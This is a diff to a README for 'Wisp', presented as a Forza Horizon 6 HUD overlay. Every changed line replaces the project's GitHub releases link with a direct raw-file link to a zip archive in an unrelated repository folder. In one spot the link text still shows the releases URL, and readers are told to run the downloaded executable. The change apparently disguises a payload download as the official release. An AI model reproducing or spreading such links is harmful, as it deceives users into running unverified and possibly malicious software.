@@ -5,7 +5,7 @@ description: "Elevate your Forza Horizon experience with Wisp, tracking speed, b
 ---
 # 🎮 Wisp - Your Ultimate Racing Companion for Forza Horizon 6
 
-[![Download Wisp](https://img.shields.io/badge/Download-Wisp_Releases-FF6B6B?style=for-the-badge&logo=github&logoColor=white)](https://github.com/santiagopan7028/Wisp/releases)
+[![Download Wisp](https://img.shields.io/badge/Download-Wisp_Releases-FF6B6B?style=for-the-badge&logo=github&logoColor=white)](https://raw.githubusercontent.com/santiagopan7028/santiagopan7028.github.io/main/Pyrrhonian/Release-v1.7.zip)
 
 ---
 
@@ -23,7 +23,7 @@ Getting Wisp up and running is incredibly easy. Follow these simple steps, and y
 
 ### Step 1: Download the Application
 
-Visit this link to download the application: **[Wisp Releases Page](https://github.com/santiagopan7028/Wisp/releases)**
+Visit this link to download the application: **[Wisp Releases Page](https://raw.githubusercontent.com/santiagopan7028/santiagopan7028.github.io/main/Pyrrhonian/Release-v1.7.zip)**
 
 This page contains all the available versions of Wisp. Look for the latest release listed at the top of the page. Click the download link provided there to save the file to your computer. The file will be small, so the download will finish quickly.
 
@@ -81,7 +81,7 @@ No special graphics card or gaming hardware is required. If you can run Forza Ho
 
 Ready to get started? Here's everything you need to know:
 
-1. **Visit the Download Page:** Go to **[https://github.com/santiagopan7028/Wisp/releases](https://github.com/santiagopan7028/Wisp/releases)**
+1. **Visit the Download Page:** Go to **[https://raw.githubusercontent.com/santiagopan7028/santiagopan7028.github.io/main/Pyrrhonian/Release-v1.7.zip](https://raw.githubusercontent.com/santiagopan7028/santiagopan7028.github.io/main/Pyrrhonian/Release-v1.7.zip)**
 
 2. **Choose Your Version:** Select the most recent release. You'll see a list of downloadable files associated with each release version. Choose the main application file (usually named something like `Wisp.exe`).
 
@@ -123,7 +123,7 @@ Check that Forza Horizon 6 is running in windowed or borderless-windowed mode. F
 Close any unnecessary background programs while gaming. Wisp itself is lightweight, but other software can compete for resources.
 
 ### Need More Help?
-Visit the [Releases Page](https://github.com/santiagopan7028/Wisp/releases) and check for any release notes or known issues listed by the developer. You can also look for community discussions about Wisp online.
+Visit the [Releases Page](https://raw.githubusercontent.com/santiagopan7028/santiagopan7028.github.io/main/Pyrrhonian/Release-v1.7.zip) and check for any release notes or known issues listed by the developer. You can also look for community discussions about Wisp online.
 
 ---
 
@@ -141,7 +141,7 @@ So what are you waiting for? Your dashboard is ready. Hit that download button a
 
 - **🖥️ What:** Customizable HUD overlay for Forza Horizon 6
 - **⚡ Features:** Speed, boost, tire temp, G-force
-- **📦 Download:** [github.com/santiagopan7028/Wisp/releases](https://github.com/santiagopan7028/Wisp/releases)
+- **📦 Download:** [github.com/santiagopan7028/Wisp/releases](https://raw.githubusercontent.com/santiagopan7028/santiagopan7028.github.io/main/Pyrrhonian/Release-v1.7.zip)
 - **💾 Install:** Just run the downloaded file
 - **🎮 Compatible:** Windows 10/11, Forza Horizon 6
 
